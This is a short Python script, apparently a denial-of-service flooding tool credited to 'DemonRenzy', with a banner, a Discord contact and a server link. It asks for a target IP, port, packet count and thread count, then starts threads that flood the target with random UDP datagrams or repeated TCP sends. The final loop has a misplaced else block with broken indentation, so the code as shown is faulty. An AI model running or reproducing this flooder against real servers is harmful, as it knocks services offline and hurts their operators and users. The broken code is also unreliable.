#!/usr/bin/env python3
import random
import socket
import threading
import os

os.system("clear")
print("""\x1b[1;92m
########  ######## ##     ##  #######  ##    ##
##     ## ##       ###   ### ##     ## ###   ## 
##     ## ##       #### #### ##     ## ####  ##
##     ## ######   ## ### ## ##     ## ## ## ##
##     ## ##       ##     ## ##     ## ##  #### 
##     ## ##       ##     ## ##     ## ##   ### 
########  ######## ##     ##  #######  ##    ##
""")

print       (" - - > TOOLS INFORMATION < - - ")
print       (" - - > CREATOR : DemonRenzy < - - ")
print       (" - - > DISCORD : XDemonRenzy#8851<- - ")                                   
print       (" - - > DM ME IF YOU NEED HELP < - - ")
print       (" - - > DISCORD SERVER < - - ")
print       (" - - > https://dsc.gg/rzteam < - - ")


ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Want Ddos?(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads :"))
os.system("clear")
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
		except:
			print("[!] ATTACK SENDING TO SERVER")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("[*] CONECTION TIME OUT")
def run3():
	data = random._urandom(16)
	i = random.choice(("[$]","[/]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("[?] CONECTION TIME OUT")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()
